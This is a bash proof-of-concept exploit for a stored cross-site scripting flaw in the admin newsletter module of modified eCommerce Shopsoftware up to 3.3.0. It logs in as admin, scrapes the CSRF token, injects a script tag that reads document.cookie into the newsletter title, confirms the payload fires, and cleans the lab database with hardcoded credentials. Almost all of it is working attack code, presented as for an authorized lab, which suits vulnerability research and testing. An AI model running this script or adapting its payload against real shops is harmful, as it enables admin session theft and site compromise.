#!/bin/bash
# PoC: Stored XSS via newsletter title — admin/module_newsletter.php
# modified eCommerce Shopsoftware <= 3.3.0 (authorized lab only)
# Requires: running lab at TARGET with admin credentials
TARGET="${TARGET:-http://localhost:9080}"
ADMIN_USER="${ADMIN_USER:-admin@shop.local}"
ADMIN_PASS="${ADMIN_PASS:-admin123}"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# 1. Login as admin, capture session
SID=$(curl -s -c /tmp/c_v20.txt -b /tmp/c_v20.txt -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/login.php?action=process" \
  --data-urlencode "username=$ADMIN_USER" \
  --data-urlencode "password=$ADMIN_PASS" \
  --data-urlencode "redirect=" \
  -D - -o /dev/null 2>/dev/null | grep -i "set-cookie.*MODsid" | \
  grep -oP '(?<=MODsid=)[^;]+' | head -1)
[ -z "$SID" ] && { echo "[-] login failed"; exit 1; }

# 2. Grab CSRF token from the newsletter page
CSRF=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" "$TARGET/admin/module_newsletter.php" | \
  grep -oP '(?<=name="securityToken" value=")[^"]+' | head -1)

# 3. Inject payload via newsletter title
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/module_newsletter.php" \
  --data-urlencode "securityToken=$CSRF" \
  --data-urlencode 'title=<script>alert(document.cookie)</script>' \
  --data-urlencode "newsletter_body=poc body" \
  --data-urlencode "cc=" \
  --data-urlencode "action=new_newsletter" -o /dev/null

# 4. Trigger: any admin opening the listing executes the payload
RESP=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" "$TARGET/admin/module_newsletter.php")
echo "$RESP" | grep -q "alert(document.cookie)" && \
  echo "[+] VULNERABLE: stored XSS fires in newsletter listing" || echo "[-] payload not found"

# 5. Cleanup (lab DB)
NL_ID=$(docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "SELECT MAX(newsletters_id) FROM newsletters;" 2>/dev/null | tail -1)
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "DELETE FROM newsletters WHERE newsletters_id='$NL_ID';" 2>/dev/null
rm -f /tmp/c_v20.txt
